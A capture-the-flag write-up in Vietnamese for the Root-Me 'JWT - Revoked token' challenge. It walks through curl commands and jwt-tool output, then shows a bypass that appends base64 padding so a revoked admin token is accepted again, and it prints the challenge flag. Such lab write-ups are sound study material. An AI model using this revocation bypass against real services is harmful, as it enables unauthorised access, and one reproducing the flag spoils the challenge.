# JWT - Revoked token

## Solution

Yêu cầu một token

```
$ curl -X POST http://challenge01.root-me.org/web-serveur/ch63/login --data '{"username":"admin","password":"admin"}' -H "Content-Type: application/json"
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODU1OTc2NzEsIm5iZiI6MTU4NTU5NzQ5MSwiZnJlc2giOmZhbHNlLCJpZGVudGl0eSI6ImFkbWluIiwidHlwZSI6ImFjY2VzcyIsImlhdCI6MTU4NTU5NzQ5MSwianRpIjoiODJhZjY4MDItNzY3YS00MDcyLWFiNzctZTBiYTBmZjVkYTAwIn0.lVhyikUFE-cAaSPH3gbvdDMkCJaLgV5xmzjEsBzw3pU"}
```

Cố gắng truy cập admin bằng token

```
$ curl -X GET http://challenge01.root-me.org/web-serveur/ch63/admin -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODU1OTc2NzEsIm5iZiI6MTU4NTU5NzQ5MSwiZnJlc2giOmZhbHNlLCJpZGVudGl0eSI6ImFkbWluIiwidHlwZSI6ImFjY2VzcyIsImlhdCI6MTU4NTU5NzQ5MSwianRpIjoiODJhZjY4MDItNzY3YS00MDcyLWFiNzctZTBiYTBmZjVkYTAwIn0.lVhyikUFE-cAaSPH3gbvdDMkCJaLgV5xmzjEsBzw3pU'
{"msg":"Token has expired"}
```

Token đã hết hạn, kiểm tra tuổi thọ của nó:

```
$ jwt-tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODU1OTc2NzEsIm5iZiI6MTU4NTU5NzQ5MSwiZnJlc2giOmZhbHNlLCJpZGVudGl0eSI6ImFkbWluIiwidHlwZSI6ImFjY2VzcyIsImlhdCI6MTU4NTU5NzQ5MSwianRpIjoiODJhZjY4MDItNzY3YS00MDcyLWFiNzctZTBiYTBmZjVkYTAwIn0.lVhyikUFE-cAaSPH3gbvdDMkCJaLgV5xmzjEsBzw3pU

  $$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$$$\                  $$\
  \__$$ |$$ | $\  $$ |\__$$  __| \__$$  __|                 $$ |
     $$ |$$ |$$$\ $$ |   $$ |       $$ | $$$$$$\   $$$$$$\  $$ |
     $$ |$$ $$ $$\$$ |   $$ |       $$ |$$  __$$\ $$  __$$\ $$ |
$$\   $$ |$$$$  _$$$$ |   $$ |       $$ |$$ /  $$ |$$ /  $$ |$$ |
$$ |  $$ |$$$  / \$$$ |   $$ |       $$ |$$ |  $$ |$$ |  $$ |$$ |
\$$$$$$  |$$  /   \$$ |   $$ |       $$ |\$$$$$$  |\$$$$$$  |$$ |
\______/ \__/     \__|   \__|$$$$$$\__| \______/  \______/ \__|
Version 1.3.2                \______|                          


=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = HS256
[+] typ = JWT

Token payload values:
[+] exp = 1585597671    ==> TIMESTAMP = 2020-03-30 21:47:51 (UTC)
[+] nbf = 1585597491    ==> TIMESTAMP = 2020-03-30 21:44:51 (UTC)
[+] fresh = False
[+] identity = admin
[+] type = access
[+] iat = 1585597491    ==> TIMESTAMP = 2020-03-30 21:44:51 (UTC)
[+] jti = 82af6802-767a-4072-ab77-e0ba0ff5da00

Seen timestamps:
[*] exp was seen
[-] nbf is earlier than exp by: 0 days, 0 hours, 3 mins
[-] iat is earlier than exp by: 0 days, 0 hours, 3 mins
[-] TOKEN IS EXPIRED!

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

Token chỉ có hiệu lực trong 3 phút. Hãy cố gắng nhanh hơn lần này.

```
$ curl -X GET http://challenge01.root-me.org/web-serveur/ch63/admin -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODU1OTg0NTcsIm5iZiI6MTU4NTU5ODI3NywiZnJlc2giOmZhbHNlLCJpZGVudGl0eSI6ImFkbWluIiwidHlwZSI6ImFjY2VzcyIsImlhdCI6MTU4NTU5ODI3NywianRpIjoiMWNiN2M4MzktNjMyZC00MzhjLTkwNjktMTkzMWNhNzE2ZTUwIn0.A0ug7IWXcIIfnKjyxa8BygqfYq9f7CiPUHsFMCNXuBY'
{"msg":"Token is revoked"}
```

Lần này, với một token chưa hết hạn, nó sẽ nói rằng token đã bị thu hồi.

Thay vì thu hồi/đưa JTI (ID JWT) vào danh sách đen, nên thu hồi toàn bộ chuỗi JWT hoặc một hàm băm của chuỗi đó.

Vì vậy, bằng cách thêm phần đệm, chuỗi/hàm băm sẽ thay đổi nhưng token vẫn sẽ giống nhau và không thực sự bị thu hồi.

Vì vậy, chỉ cần thêm `=` (base64 padding).

```
jwt1=$(curl -s -X POST http://challenge01.root-me.org/web-serveur/ch63/login --data '{"username":"admin","password":"admin"}' -H "Content-Type: application/json" | jq '.access_token' | tr -d '"')
curl -X GET http://challenge01.root-me.org/web-serveur/ch63/admin -H "Authorization: Bearer $jwt1="

{"Congratzzzz!!!_flag:":"Do_n0t_xXxXxX_3nc0d3dTokenz_MxXxXe,XxX_th3_XxI_f1xXd"}
```

Lưu ý: Trong thực tế, điều này không hiệu quả vì trong RFC 7515 có nói rằng base64 được sử dụng là base64 an toàn cho URL, do đó cần loại bỏ phần đệm.

Để chấp nhận padding, nhà phát triển có thể giải mã thủ công từng phần trong 3 phần của JWT hoặc không triển khai các hàm mã hóa và giải mã base64url mà không cần đệm dựa trên các hàm mã hóa và giải mã base64 chuẩn sử dụng phần đệm như đã giải thích trong [Phụ lục C của RFC 7515](https://tools.ietf.org/html/rfc7515#appendix-C).
